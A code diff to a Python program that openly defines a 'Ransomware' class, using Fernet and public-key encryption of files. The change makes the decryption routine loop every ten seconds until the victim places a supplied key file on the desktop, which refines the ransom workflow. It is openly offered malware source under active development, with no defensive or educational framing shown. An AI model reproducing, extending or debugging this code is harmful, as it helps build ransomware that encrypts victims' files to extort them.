@@ -2,6 +2,7 @@ import base64
 import os
 import subprocess
 import threading
+import time
 
 from cryptography.hazmat.backends import default_backend as crypto_default_backend
 from cryptography.hazmat.primitives import hashes as crypto_hashes
@@ -94,15 +95,17 @@ class Ransomware:
 
     def decrypt_system(self):
         print("Started Decryption")
-        try:
-            with open(f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem', 'r') as f:
-                self.key = f.read()
-                self.crypter = Fernet(self.key)
-                self.encrypt_system(encrypted=True)
-                # break
-        except Exception as e:
-            print(e)  # Debugging/Testing
-            pass
+        while True:
+            try:
+                with open(f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem', 'r') as f:
+                    self.key = f.read()
+                    self.crypter = Fernet(self.key)
+                    self.encrypt_system(encrypted=True)
+                    break
+            except Exception as e:
+                    print(e)
+                    pass
+            time.sleep(10)
 
 
 def encrypt_blob(fileblob, public_key):
